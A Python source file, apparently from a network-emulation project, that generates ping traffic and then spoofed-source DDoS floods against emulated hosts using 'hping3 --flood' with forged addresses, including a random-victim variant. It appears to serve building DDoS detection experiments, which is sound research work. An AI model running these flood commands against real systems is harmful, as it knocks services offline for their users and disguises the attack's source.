import random
import time
import numpy as np

# time out between each command
TIMEOUT = 5
# define how many normal traffic before attack
PRERUN_EPOCH = 2
MAX = 9999999


class BasicAttacker:
    
    def __init__(self, victim, attacker, hosts):
        self.victim = victim # should be h1
        self.attacker = attacker # should be h4
        self.hosts = hosts
    
    def normal_traffic(self, epoch=MAX):
        time.sleep(TIMEOUT)
        current_epoch = 0
        while current_epoch < epoch:
            random_host = self.hosts[random.randint(0, len(self.hosts)-1)]
            random_timeout = str(TIMEOUT)
            random_interval = str(random.uniform(0,0.1))
            ping_cmd = 'ping -w ' + random_timeout + ' -i ' +  random_interval + ' ' + self.victim.IP()
            random_host.cmd(ping_cmd)
            current_epoch += 1

    def ddos_traffic(self, ddos_timeout=MAX):
        time.sleep(TIMEOUT)
        for host in self.hosts:
            spoof_ip = host.IP()
            ddos_cmd = 'hping3 --flood ' + self.victim.IP() + ' -a ' + spoof_ip + ' &'
            self.attacker.cmd(ddos_cmd)
            print ddos_cmd

        time.sleep(ddos_timeout)
        print("killing all.....")
        kill_cmd = 'kill $(jobs -p)'
        self.attacker.cmd(kill_cmd)
    
    # first normal traffic then start ddos attack (loop)
    def mix_traffic(self):
        time.sleep(TIMEOUT)
        while True:
            self.normal_traffic(PRERUN_EPOCH)
            self.ddos_traffic(60)


        
class LargeAttacker:
    
    def __init__(self, victim, attacker, hosts, out_domain_host):
        self.victim = victim 
        self.attacker = attacker 
        self.hosts = hosts
        self.out_domain_host = out_domain_host
        self.num_sample = 3
    
    def normal_traffic(self, epoch=MAX):
        time.sleep(TIMEOUT)
        current_epoch = 0
        while current_epoch < epoch:
            random_timeout = str(TIMEOUT)
            for i in range(self.num_sample):
                random_host = self.hosts[random.randint(0, len(self.hosts)-1)]
                random_interval = str(random.uniform(0,0.05))
                ping_cmd = 'ping -w ' + random_timeout + ' -i ' +  random_interval + ' ' + self.victim.IP() + ' &'
                random_host.cmd(ping_cmd)
            time.sleep(TIMEOUT)
            current_epoch += 1
    
    def ddos_traffic(self, ddos_timeout=MAX):
        time.sleep(TIMEOUT)
        for host in self.hosts:
            spoof_ip = host.IP()
            ddos_cmd = 'hping3 --flood ' + self.victim.IP() + ' -a ' + spoof_ip + ' &'
            self.attacker.cmd(ddos_cmd)
            print ddos_cmd
        
        time.sleep(ddos_timeout)
        print("killing all.....")
        kill_cmd = 'kill $(jobs -p)'
        self.attacker.cmd(kill_cmd)
    
    # new type of ddos attack that attacks random victim
    # should only test in large topo
    def random_ddos_traffic(self, ddos_timeout=MAX):
        time.sleep(TIMEOUT)
        for host in self.hosts:
            ddos_cmd = 'hping3 --flood ' + host.IP() + ' &'
            self.attacker.cmd(ddos_cmd)
        
        time.sleep(ddos_timeout)
        print("killing all.....")
        kill_cmd = 'kill $(jobs -p)'
        self.attacker.cmd(kill_cmd)

    def mix_traffic(self):
        time.sleep(TIMEOUT)
        while True:
            self.normal_traffic(PRERUN_EPOCH)
            self.ddos_traffic(60)